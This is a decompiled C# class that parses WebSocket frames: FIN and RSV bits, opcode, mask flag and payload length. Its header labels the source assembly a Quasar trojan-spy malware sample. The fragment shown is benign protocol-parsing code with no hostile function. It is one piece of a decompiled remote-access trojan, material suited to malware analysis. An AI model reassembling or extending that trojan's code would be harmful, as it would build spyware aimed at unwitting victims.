// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.WebSocket4Net.Protocol.WebSocketDataFrame
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.WebSocket4Net.Common;

namespace NoiseMe.Drags.App.Models.WebSocket4Net.Protocol
{
  public class WebSocketDataFrame
  {
    private ArraySegmentList m_InnerData;
    private long m_ActualPayloadLength = -1;

    public ArraySegmentList InnerData => this.m_InnerData;

    public WebSocketDataFrame(ArraySegmentList data)
    {
      this.m_InnerData = data;
      this.m_InnerData.ClearSegements();
    }

    public bool IsControlFrame
    {
      get
      {
        switch (this.OpCode)
        {
          case 8:
          case 9:
          case 10:
            return true;
          default:
            return false;
        }
      }
    }

    public bool FIN => ((int) this.m_InnerData[0] & 128) == 128;

    public bool RSV1 => ((int) this.m_InnerData[0] & 64) == 64;

    public bool RSV2 => ((int) this.m_InnerData[0] & 32) == 32;

    public bool RSV3 => ((int) this.m_InnerData[0] & 16) == 16;

    public sbyte OpCode => (sbyte) ((int) this.m_InnerData[0] & 15);

    public bool HasMask => ((int) this.m_InnerData[1] & 128) == 128;

    public sbyte PayloadLenght => (sbyte) ((int) this.m_InnerData[1] & (int) sbyte.MaxValue);

    public long ActualPayloadLength
    {
      get
      {
        if (this.m_ActualPayloadLength >= 0L)
          return this.m_ActualPayloadLength;
        sbyte payloadLenght = this.PayloadLenght;
        if (payloadLenght < (sbyte) 126)
          this.m_ActualPayloadLength = (long) payloadLenght;
        else if (payloadLenght == (sbyte) 126)
        {
          this.m_ActualPayloadLength = (long) ((int) this.m_InnerData[2] * 256 + (int) this.m_InnerData[3]);
        }
        else
        {
          long num1 = 0;
          int num2 = 1;
          for (int index = 7; index >= 0; --index)
          {
            num1 += (long) ((int) this.m_InnerData[index + 2] * num2);
            num2 *= 256;
          }
          this.m_ActualPayloadLength = num1;
        }
        return this.m_ActualPayloadLength;
      }
    }

    public byte[] MaskKey { get; set; }

    public byte[] ExtensionData { get; set; }

    public byte[] ApplicationData { get; set; }

    public int Length => this.m_InnerData.Count;

    public void Clear()
    {
      this.m_InnerData.ClearSegements();
      this.ExtensionData = new byte[0];
      this.ApplicationData = new byte[0];
      this.m_ActualPayloadLength = -1L;
    }
  }
}
